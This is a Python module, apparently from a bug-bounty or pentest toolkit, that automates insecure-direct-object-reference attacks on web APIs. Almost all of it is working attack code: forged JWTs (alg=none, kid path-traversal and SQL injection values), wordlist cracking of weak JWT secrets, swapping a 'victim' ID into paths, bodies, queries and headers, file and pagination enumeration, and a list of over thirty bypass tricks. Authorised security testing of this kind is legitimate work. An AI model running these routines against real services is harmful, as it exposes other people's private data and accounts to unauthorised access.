"""
idor_testing_advanced.py — Advanced IDOR Testing Techniques.

Implements:
  B6. JWT Manipulation (alg=none, kid injection, weak secret)
  B7. Path vs Body + Cross-Location Conflicts
  B8. File / Search / Pagination IDOR
  B9. Predictable ID Patterns + Time-Based Windows
  B10. Bypass Checklist (30+ techniques) + Blind/2nd-Order IDOR
"""
import base64
import hashlib
import hmac
import json
import re
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from idor_utils import (
    C, G, Y, R, M, BOLD, RST, DIM,
    curl_request, fetch, load_lines, save_lines,
)


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
def _b64url_decode(s):
    """Decode base64url without padding."""
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def _b64url_encode(b):
    """Encode to base64url without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _looks_private(body):
    if not body:
        return False
    patterns = [
        r'"(email|phone|address|ssn|dob|salary|balance|token|secret|password)"\s*:',
        r'"user[_-]?id"\s*:\s*\d+',
        r'"is[_-]?admin"\s*:\s*(true|false)',
    ]
    return any(re.search(p, body, re.IGNORECASE) for p in patterns)


# ═══════════════════════════════════════════════════════════
# B6. JWT MANIPULATION
# ═══════════════════════════════════════════════════════════
def _parse_jwt(token):
    """Return (header_dict, payload_dict, signature_b64) or (None, None, None)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None, None, None
    try:
        h = json.loads(_b64url_decode(parts[0]))
        p = json.loads(_b64url_decode(parts[1]))
        return h, p, parts[2]
    except Exception:
        return None, None, None


def _build_jwt(header, payload, signature=""):
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def test_jwt_manipulation(url, token, cookies=None, api_key=None):
    """
    Test common JWT bypasses:
      1. alg=none (remove signature)
      2. Signature strip (keep alg)
      3. kid injection (path traversal, SQL)
      4. Empty signature
    Returns findings.
    """
    findings = []
    header, payload, sig = _parse_jwt(token)
    if not header:
        return findings

    # Baseline
    base_headers = {"Authorization": f"Bearer {token}"}
    r_base = curl_request(url, cookies=cookies, headers=base_headers, timeout=8)
    if r_base["status"] not in (200, 201, 204):
        return findings

    # Variants to try
    variants = []

    # 1. alg=none, no signature
    h_none = dict(header); h_none["alg"] = "none"
    variants.append(("alg-none", _build_jwt(h_none, payload, "")))

    # 2. alg=None (capitalized), no signature
    h_none2 = dict(header); h_none2["alg"] = "None"
    variants.append(("alg-None", _build_jwt(h_none2, payload, "")))

    # 3. alg=none with trailing dot
    h_none3 = dict(header); h_none3["alg"] = "none"
    variants.append(("alg-none-sig-empty", _build_jwt(h_none3, payload, "")))

    # 4. alg=HS256 with empty signature
    h_hs = dict(header); h_hs["alg"] = "HS256"
    variants.append(("HS256-empty-sig", _build_jwt(h_hs, payload, "")))

    # 5. alg=HS256 with original signature
    variants.append(("HS256-orig-sig", _build_jwt(h_hs, payload, sig)))

    # 6. kid injection: path traversal
    h_kid = dict(header)
    if "kid" in h_kid:
        h_kid["kid"] = "../../../../dev/null"
        variants.append(("kid-path-traversal", _build_jwt(h_kid, payload, "")))

    # 7. kid injection: SQL
    h_kid2 = dict(header)
    if "kid" in h_kid2:
        h_kid2["kid"] = "' OR '1'='1"
        variants.append(("kid-sql", _build_jwt(h_kid2, payload, "")))

    # Test each variant
    for label, new_token in variants:
        h = {"Authorization": f"Bearer {new_token}"}
        r = curl_request(url, cookies=cookies, headers=h, timeout=8)
        if r["status"] in (200, 201, 204) and _looks_private(r.get("body", "")):
            findings.append({
                "type": "jwt-bypass",
                "url": url,
                "variant": label,
                "status": r["status"],
                "reason": f"JWT variant '{label}' accepted by server",
                "confidence": "high",
                "preview": r.get("body", "")[:200],
            })
        time.sleep(0.2)

    return findings


def crack_jwt_weak_secret(token, wordlist=None, api_key=None):
    """
    Try to crack a weak HS256 secret using a wordlist.
    Returns the secret if found, else None.
    """
    header, payload, sig = _parse_jwt(token)
    if not header or header.get("alg") not in ("HS256", "HS384", "HS512"):
        return None

    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    sig_bytes = _b64url_decode(sig)
    algorithm = header["alg"]

    # Default wordlist
    if wordlist is None:
        wordlist = [
            "secret", "password", "123456", "admin", "key", "jwt",
            "secret123", "jwtsecret", "default", "changeme",
            "your-256-bit-secret", "supersecret", "test",
        ]

    for word in wordlist:
        try:
            if algorithm == "HS256":
                computed = hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
            elif algorithm == "HS384":
                computed = hmac.new(word.encode(), signing_input, hashlib.sha384).digest()
            elif algorithm == "HS512":
                computed = hmac.new(word.encode(), signing_input, hashlib.sha512).digest()
            else:
                continue
            if computed == sig_bytes:
                return word
        except Exception:
            continue
    return None


# ═══════════════════════════════════════════════════════════
# B7. PATH vs BODY + CROSS-LOCATION CONFLICTS
# ═══════════════════════════════════════════════════════════
def test_path_body_conflict(url, own_id, victim_id, method="PUT",
                             body_template=None, cookies=None, headers=None):
    """
    Keep own_id in path, victim_id in body.
    Server may auth-check path but fetch data from body.
    """
    findings = []
    # Assume URL has own_id in path
    if str(own_id) not in url:
        return findings

    # Body = {id: victim_id, ...}
    body = dict(body_template or {})
    body["id"] = victim_id
    body["user_id"] = victim_id

    h = dict(headers or {})
    h["Content-Type"] = "application/json"

    r = curl_request(url, method=method, cookies=cookies, headers=h,
                     data=json.dumps(body), timeout=10)

    if r["status"] in (200, 201, 204) and _looks_private(r.get("body", "")):
        findings.append({
            "type": "path-body-conflict",
            "url": url,
            "method": method,
            "reason": "Server uses path for auth, body for data fetch",
            "confidence": "high",
            "body_sent": json.dumps(body)[:200],
            "preview": r.get("body", "")[:200],
        })
    return findings


def test_query_body_conflict(url, own_id, victim_id, method="POST",
                              cookies=None, headers=None):
    """
    Query has own_id (auth), body has victim_id (action).
    """
    findings = []
    # Ensure query has own_id
    p = urlparse(url)
    q = parse_qs(p.query, keep_blank_values=True)
    if "id" not in q and "user_id" not in q and "account_id" not in q:
        return findings

    # Set query id = own_id
    for key in q:
        if key in ("id", "user_id", "account_id", "address_id"):
            q[key] = [str(own_id)]

    new_url = urlunparse((p.scheme, p.netloc, p.path, p.params,
                          urlencode(q, doseq=True), p.fragment))

    # Body = victim_id
    body = {"id": victim_id, "user_id": victim_id}

    h = dict(headers or {})
    h["Content-Type"] = "application/json"

    r = curl_request(new_url, method=method, cookies=cookies, headers=h,
                     data=json.dumps(body), timeout=10)

    if r["status"] in (200, 201, 204):
        body_text = r.get("body", "")
        if not re.search(r'\b(error|forbidden|unauthorized)\b', body_text, re.IGNORECASE):
            findings.append({
                "type": "query-body-conflict",
                "url": new_url,
                "method": method,
                "reason": "Query used for auth, body used for action",
                "confidence": "high",
                "body_sent": json.dumps(body)[:200],
            })
    return findings


def test_header_conflict(url, own_id, victim_id, cookies=None):
    """
    Try X-User-Id, X-Account-Id, etc. with victim_id.
    """
    findings = []
    headers_to_try = [
        "X-User-Id", "X-Account-Id", "X-User", "User-Id",
        "X-Forwarded-User", "X-Authenticated-User",
    ]
    for h_name in headers_to_try:
        h = {h_name: str(victim_id)}
        r = curl_request(url, cookies=cookies, headers=h, timeout=8)
        if r["status"] == 200 and _looks_private(r.get("body", "")):
            findings.append({
                "type": "header-idor",
                "url": url,
                "header": h_name,
                "value": victim_id,
                "reason": f"{h_name} header trusted for ID",
                "confidence": "medium",
            })
    return findings


# ═══════════════════════════════════════════════════════════
# B8. FILE / SEARCH / PAGINATION IDOR
# ═══════════════════════════════════════════════════════════
def test_file_operations(url_list, own_id, victim_id, cookies=None):
    """
    Test IDOR on file download/export/attachment endpoints.
    """
    findings = []
    for url in url_list[:20]:
        if str(own_id) not in url:
            continue
        target = url.replace(str(own_id), str(victim_id), 1)
        r = curl_request(target, cookies=cookies, timeout=10)

        if r["status"] == 200:
            body = r.get("body", "")
            # If response is a file (large, binary, or contains PDF/ZIP/CSV markers)
            is_file = (
                len(body) > 1000 or
                body.startswith("%PDF") or
                body.startswith("PK\x03\x04") or
                "Content-Disposition" in str(r.get("headers", {}))
            )
            if is_file:
                findings.append({
                    "type": "file-idor",
                    "url": target,
                    "status": r["status"],
                    "size": len(body),
                    "reason": "File download returned victim's file",
                    "confidence": "high",
                })
    return findings


def test_search_idor(search_url, search_param, victim_email_prefix, cookies=None, headers=None):
    """
    Search for victim's partial info; check if PII leaks.
    """
    findings = []
    p = urlparse(search_url)
    q = parse_qs(p.query, keep_blank_values=True)
    q[search_param] = [victim_email_prefix]
    new_url = urlunparse((p.scheme, p.netloc, p.path, p.params,
                          urlencode(q, doseq=True), p.fragment))

    r = fetch(new_url, timeout=8, cookies=cookies, headers=headers)
    if r["status"] == 200 and r["body"]:
        # If response contains full PII beyond the search prefix
        if re.search(r'"[^"]*@[^"]*\.[a-z]{2,}"', r["body"], re.IGNORECASE):
            findings.append({
                "type": "search-idor",
                "url": new_url,
                "reason": "Search leaks full emails beyond query",
                "confidence": "medium",
                "preview": r["body"][:300],
            })
    return findings


def test_pagination_enum(url, cookies=None, max_pages=20):
    """
    Test if pagination leaks other users' data.
    """
    findings = []
    p = urlparse(url)
    q = parse_qs(p.query, keep_blank_values=True)

    seen_ids = set()
    for page in range(1, max_pages + 1):
        q["page"] = [str(page)]
        q["pageSize"] = ["100"]
        q["limit"] = ["100"]
        new_url = urlunparse((p.scheme, p.netloc, p.path, p.params,
                              urlencode(q, doseq=True), p.fragment))
        r = fetch(new_url, timeout=8, cookies=cookies)
        if r["status"] != 200 or not r["body"]:
            continue

        # Extract IDs
        for m in re.findall(r'"(?:id|user_id|userId)"\s*:\s*"?(\d+)"?', r["body"]):
            seen_ids.add(m)

        time.sleep(0.2)

    if len(seen_ids) > 100:
        findings.append({
            "type": "pagination-enum",
            "url": url,
            "unique_ids_found": len(seen_ids),
            "reason": f"Pagination leaked {len(seen_ids)} unique IDs",
            "confidence": "medium",
        })
    return findings


# ═══════════════════════════════════════════════════════════
# B9. PREDICTABLE IDs + TIME-BASED
# ═══════════════════════════════════════════════════════════
def detect_predictable_ids(ids_list):
    """
    Analyze a list of IDs for sequential/predictable patterns.
    Returns dict with analysis.
    """
    if len(ids_list) < 3:
        return {"pattern": "insufficient-data"}

    try:
        nums = sorted(int(i) for i in ids_list if str(i).isdigit())
    except Exception:
        return {"pattern": "non-numeric"}

    if len(nums) < 3:
        return {"pattern": "non-numeric"}

    # Sequential check
    diffs = [nums[i + 1] - nums[i] for i in range(len(nums) - 1)]
    if all(d == 1 for d in diffs):
        return {"pattern": "sequential", "step": 1, "range": (nums[0], nums[-1])}

    # Constant step
    if len(set(diffs)) == 1:
        return {"pattern": "arithmetic", "step": diffs[0], "range": (nums[0], nums[-1])}

    # Timestamp-based?
    avg = sum(nums) / len(nums)
    if 1600000000 < avg < 2000000000:  # Unix epoch (sec)
        return {"pattern": "unix-timestamp", "range": (nums[0], nums[-1])}
    if 1600000000000 < avg < 2000000000000:  # Unix epoch (ms)
        return {"pattern": "unix-timestamp-ms", "range": (nums[0], nums[-1])}

    return {"pattern": "random-or-mixed", "step_avg": sum(diffs) / len(diffs)}


def test_time_window(url, timestamp_param, own_ts, victim_id, own_id,
                     cookies=None, window_seconds=60):
    """
    Test if server accepts a timestamp within a window with victim's ID.
    """
    findings = []
    for offset in [0, 5, 10, 30, window_seconds]:
        test_ts = int(own_ts) + offset
        p = urlparse(url)
        q = parse_qs(p.query, keep_blank_values=True)
        q[timestamp_param] = [str(test_ts)]

        # Replace own_id with victim_id in URL path if present
        path = p.path
        if str(own_id) in path:
            path = path.replace(str(own_id), str(victim_id), 1)

        new_url = urlunparse((p.scheme, p.netloc, path, p.params,
                              urlencode(q, doseq=True), p.fragment))

        r = fetch(new_url, timeout=8, cookies=cookies)
        if r["status"] == 200 and _looks_private(r["body"]):
            findings.append({
                "type": "time-window",
                "url": new_url,
                "offset_seconds": offset,
                "reason": f"Timestamp accepted with offset {offset}s and victim ID",
                "confidence": "high",
            })
            break
        time.sleep(0.2)
    return findings


# ═══════════════════════════════════════════════════════════
# B10. BYPASS CHECKLIST + BLIND IDOR
# ═══════════════════════════════════════════════════════════
BYPASS_TECHNIQUES = [
    # URL manipulation
    ("api-version", "change /api/v1/ to /api/v2/"),
    ("extension", "add .json / .xml / .html"),
    ("no-id", "remove ID entirely"),
    ("plural", "pluralize /user/ to /users/"),
    ("wildcard", "use * instead of ID"),
    ("path-traversal", "/YOUR_ID/../VICTIM_ID"),
    ("double-encode", "%32%32%36%35%31"),
    ("trailing-slash", "add /"),
    ("case-change", "/USER/ instead of /user/"),
    ("dot-slash", "/./ID"),
    # Parameter
    ("pagination", "?page=1&pageSize=100"),
    ("include", "?include=email,firstname"),
    ("fields", "?fields=all"),
    ("format", "?format=json"),
    # Method
    ("method-post", "GET->POST"),
    ("method-put", "GET->PUT"),
    ("method-patch", "GET->PATCH"),
    ("method-override-header", "X-HTTP-Method-Override"),
    ("method-param", "_method=PATCH"),
    ("empty-body-put", "PUT with empty body"),
    # ID location
    ("path-query", "own in path, victim in query"),
    ("path-body", "own in path, victim in body"),
    ("query-body", "own in query, victim in body"),
    ("header-user-id", "X-User-Id: victim"),
    # Body
    ("empty-body", "remove entire body"),
    ("remove-params", "remove specific params"),
    ("ct-json", "Content-Type: application/json"),
    ("ct-form", "Content-Type: form-urlencoded"),
    ("ct-multipart", "Content-Type: multipart"),
    # ID encoding
    ("array-wrap", '{"id": [VICTIM]}'),
    ("object-wrap", '{"id": {"id": VICTIM}}'),
    ("string-id", '{"id": "VICTIM"}'),
    ("int-id", '{"id": VICTIM}'),
]


def generate_bypass_checklist(idir, candidates=None):
    """
    Write the full bypass checklist to a markdown file for manual review.
    """
    out = Path(idir) / "BYPASS_CHECKLIST.md"
    lines = ["# IDOR Bypass Checklist\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    lines.append(f"Total techniques: {len(BYPASS_TECHNIQUES)}\n\n")
    lines.append("## Techniques\n")
    for tag, desc in BYPASS_TECHNIQUES:
        lines.append(f"- [ ] **{tag}**: {desc}")
    lines.append("\n## Candidates to apply on\n")
    if candidates:
        for c in candidates[:50]:
            lines.append(f"- [ ] `{c}`")
    out.write_text("\n".join(lines), encoding="utf-8")
    return str(out)


def test_bypass_variants(url, cookies=None):
    """
    Auto-try URL-based bypass variants on a given URL.
    """
    findings = []
    p = urlparse(url)

    # Extract last numeric segment (potential ID)
    m = re.search(r'/(\d+)(?:/|$)', p.path)
    if not m:
        return findings
    own_id = m.group(1)
    victim_id = str(int(own_id) + 1)  # try next ID

    variants = []

    # v1: change api version
    new_path = re.sub(r'/v\d+/', '/v2/', p.path)
    variants.append(("api-version", urlunparse((p.scheme, p.netloc, new_path,
                                                 p.params, p.query, p.fragment))))

    # v2: add .json
    new_path = p.path + ".json"
    variants.append(("extension-json", urlunparse((p.scheme, p.netloc, new_path,
                                                    p.params, p.query, p.fragment))))

    # v3: add trailing slash
    new_path = p.path.rstrip("/") + "/"
    variants.append(("trailing-slash", urlunparse((p.scheme, p.netloc, new_path,
                                                    p.params, p.query, p.fragment))))

    # v4: path traversal
    new_path = p.path.replace(f"/{own_id}", f"/{own_id}/../{victim_id}")
    variants.append(("path-traversal", urlunparse((p.scheme, p.netloc, new_path,
                                                    p.params, p.query, p.fragment))))

    # v5: double-encode
    enc = "".join(f"%{ord(c):02x}" for c in victim_id)
    new_path = p.path.replace(f"/{own_id}", f"/{enc}")
    variants.append(("double-encode", urlunparse((p.scheme, p.netloc, new_path,
                                                   p.params, p.query, p.fragment))))

    # Baseline
    base = fetch(url, timeout=8, cookies=cookies)
    base_len = len(base.get("body", ""))

    for label, test_url in variants:
        r = fetch(test_url, timeout=8, cookies=cookies)
        if r["status"] == 200 and r["body"]:
            new_len = len(r["body"])
            if abs(new_len - base_len) > 50 and _looks_private(r["body"]):
                findings.append({
                    "type": "bypass",
                    "variant": label,
                    "url": test_url,
                    "reason": f"Bypass '{label}' returned different private data",
                    "confidence": "medium",
                    "preview": r["body"][:200],
                })
        time.sleep(0.2)
    return findings


def test_blind_idor(url, own_id, victim_id, cookies=None, collaborator=None):
    """
    Blind / 2nd-order IDOR.
    Trigger an action with victim's ID. Response may be generic.
    Use collaborator (webhook) to detect callbacks.
    """
    findings = []
    target = url.replace(str(own_id), str(victim_id), 1)

    h = {}
    if collaborator:
        h["X-Collaborator"] = collaborator

    r = curl_request(target, method="POST", cookies=cookies, headers=h, timeout=10)

    # Blind: 200 with generic body may still mean it worked
    if r["status"] in (200, 201, 202, 204):
        body = r.get("body", "")
        if re.search(r'(submitted|queued|processing|sent|success)', body, re.IGNORECASE):
            findings.append({
                "type": "blind-idor",
                "url": target,
                "reason": "Generic success response — verify via victim account",
                "confidence": "low",
                "preview": body[:200],
            })
    return findings


if __name__ == "__main__":
    import sys
    print("=== idor_testing_advanced standalone tests ===\n")

    # Test 1: JWT parsing
    print("[1] JWT parsing (dummy)")
    sample = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxfQ.abc"
    h, p, s = _parse_jwt(sample)
    print(f"    Header:  {h}")
    print(f"    Payload: {p}")
    print()

    # Test 2: Predictable IDs
    print("[2] Predictable ID detection:")
    print(f"    [1,2,3,4,5]:     {detect_predictable_ids([1,2,3,4,5])}")
    print(f"    [100,200,300]:   {detect_predictable_ids([100,200,300])}")
    print(f"    [1700000000,...]: {detect_predictable_ids([1700000000,1700000001,1700000002])}")
    print()

    # Test 3: Bypass checklist
    print("[3] Bypass checklist:")
    print(f"    Total techniques: {len(BYPASS_TECHNIQUES)}")
    for tag, desc in BYPASS_TECHNIQUES[:5]:
        print(f"      - {tag}: {desc}")
    print()

    # Test 4: JWT weak secret
    print("[4] JWT weak secret test (dummy):")
    test_token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxfQ.invalid"
    result = crack_jwt_weak_secret(test_token)
    print(f"    Result: {result}")
    print()

    if len(sys.argv) > 1:
        print(f"[5] Testing on {sys.argv[1]}")
